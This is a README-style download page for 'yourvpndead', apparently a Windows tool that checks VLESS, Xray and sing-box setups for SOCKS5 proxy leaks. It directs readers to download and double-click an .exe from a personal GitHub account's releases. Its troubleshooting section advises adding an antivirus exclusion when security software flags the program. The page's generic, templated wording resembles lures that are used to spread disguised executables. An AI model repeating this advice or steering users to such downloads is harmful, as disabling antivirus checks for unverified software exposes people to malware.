# 🛡️ yourvpndead - Scan your VPN for connection leaks

[!["Download yourvpndead"](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ernestaweak8629/yourvpndead)

## 🎯 Purpose of this tool

Modern web traffic often relies on protocols like VLESS, Xray, and sing-box to bypass network restrictions. While these tools provide privacy, they sometimes leak information about the underlying server infrastructure. This tool identifies whether your specific VPN setup exposes its true network address through a local SOCKS5 proxy vulnerability. Users with basic internet privacy needs can verify their setup without deep network knowledge.

## 📋 System requirements

- Windows 10 or Windows 11 (64-bit).
- At least 50 MB of disk space.
- An active internet connection.
- A functional VPN client configured with VLESS, Xray, or sing-box.

## 🚀 Setting up the software

1. Visit the following link to access the software files: [https://github.com/ernestaweak8629/yourvpndead](https://github.com/ernestaweak8629/yourvpndead).
2. Look for the "Releases" section on the right side of the page.
3. Click the most recent version available.
4. Locate the file ending in `.exe` under the "Assets" heading.
5. Download this file to your computer.
6. Open your "Downloads" folder and double-click the file to start the application.

## 🔍 How to check your connection

Once the application launches, follow these steps to perform a scan of your current network configuration:

1. Launch your preferred VPN client and ensure the connection is active.
2. Open the yourvpndead application window.
3. Select the local SOCKS5 port used by your VPN client in the settings menu. Most clients define this port in their internal preferences.
4. Click the "Scan" button.
5. Wait for the tool to analyze the connection traffic. This process usually completes within thirty seconds.
6. Review the results on the main screen. If the tool detects your real IP address or specific server identifiers, the software will highlight the vulnerability in red.

## 🛠️ Interpreting your results

The tool provides simple feedback based on the scan data:

- Green Status: Your connection appears secure. The local SOCKS5 proxy does not currently leak identifiable data about the server.
- Red Status: Your connection shows signs of an information leak. The software found a route where the server address remains exposed to potential third parties on the network.

If you see a red status, restart your VPN client or update your configuration files to a more recent version of the core protocol. Many leaks occur because the underlying configuration file lacks security headers.

## 🔧 Troubleshooting common issues

- Application fails to start: Ensure your Windows version has the latest security updates installed.
- Scan times out: Check your VPN client settings to ensure the SOCKS5 proxy feature is enabled.
- Antivirus alerts: Some security programs might flag unauthorized network scanners. Add an exclusion for this folder in your antivirus settings if you trust the software execution.
- No network access: Disconnect your VPN and try again to verify your home internet works independently.

## ❓ Frequently asked questions

Does this tool change my settings?
No. The software only observes traffic passing through the local proxy. It does not modify, delete, or save your VPN configuration files.

Can I run this on a work computer?
Check your workplace policy before installing software. This tool creates outbound network requests to test your proxy configuration.

Do I need to be a developer to use this?
No. This tool provides a simple interface for users who want to verify their privacy settings. The technical internal logic handles the packet inspection automatically.

What protocols does this support?
The tool supports VLESS, Xray, and sing-box configurations that utilize local SOCKS5 proxy ports for local traffic routing.

Does the tool send my data to a server?
The scan happens locally. The tool does not upload your personal data, VPN keys, or private identifiers to any remote server. It only scans the local socket to see if information escapes the proxy tunnel.

## 💡 Best practices for privacy

Use this tool regularly if you update your VPN configuration. Keep your VPN client updated to the latest version to maintain protection against known vulnerabilities. If you notice persistent leaks, consider switching to a different VPN provider or a different transport protocol within your current setup. Always use strong, unique passwords for your proxy configurations if your interface requires them. 

This tool serves as an audit component for your local system. It helps you verify that your chosen privacy tools work as intended under your current network conditions. Regular audits significantly reduce the risk of accidental identity leaks while browsing the internet.